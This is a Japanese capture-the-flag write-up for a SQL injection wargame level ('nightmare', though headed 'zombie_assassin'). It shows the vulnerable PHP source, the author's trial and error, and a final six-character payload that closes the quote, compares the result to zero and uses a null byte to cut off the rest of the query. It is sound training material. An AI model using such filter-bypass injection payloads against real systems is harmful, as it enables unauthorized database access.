# zombie_assassin

## answer

```
https://los.eagle-jump.org/nightmare_ce407ee88ba848c2bec8e42aaeaa6ad4.php?pw=%27)=0;%00
```

## problem

```
query : select id from prob_nightmare where pw=('1') and id!='admin'

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) solve("nightmare"); 
  highlight_file(__FILE__); 
?>
```

## memo

```https://los.eagle-jump.org/nightmare_ce407ee88ba848c2bec8e42aaeaa6ad4.php?pw=1```とかで試してみる。

```query : select id from prob_nightmare where pw=('1') and id!='admin'```となった。

コードを読んでいく。

```
if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~");
if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
```

フィルターはきつめ。さらに6文字以上を許していない。

```
$query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
```

idがadminではない人のパスワードが一致したときにidに値が入る。

```
if($result['id']) solve("nightmare"); 
```

クリア条件としてはクエリを真にすればいいっぽい。
ちなみにフィルターはコメントアウト```#```を禁止している。
```'```はいける。

閉じてみよう。

```
?pw=')

query : select id from prob_nightmare where pw=('')') and id!='admin'
```

閉じれている気がする。
これをふまえて、以下で試してみる。

```
?pw=')or1;

query : select id from prob_nightmare where pw=('')or1;') and id!='admin'
```

なんかダメっぽい。

コメントアウトができないからだと思っています。

コメントアウトは%00をはさむ方法でできるか試してみる。

```
?pw=')or1;%00

No Hack ~_~
```

7文字使ってしまっているのか...文字数制限が厳しい...

ここでイコールが禁じられていないことを利用して、こんな感じのクエリを作ることを考えてみる。

```
query : select id from prob_nightmare where pw=('')=XXX%00 and id!='admin'
```

%00以降はコメントアウトされている。
pw=('')の結果とXXXがイコールなら、このクエリは真を返す。
もちろん使うDBによるが、pw=('')自体の文はAuto Castingにより値をもつ。0かな。

できあがったスクリプトは以下。

```
?pw=')=0;%00
```

## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [ereg | php manual](https://www.php.net/manual/ja/function.ereg.php)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)
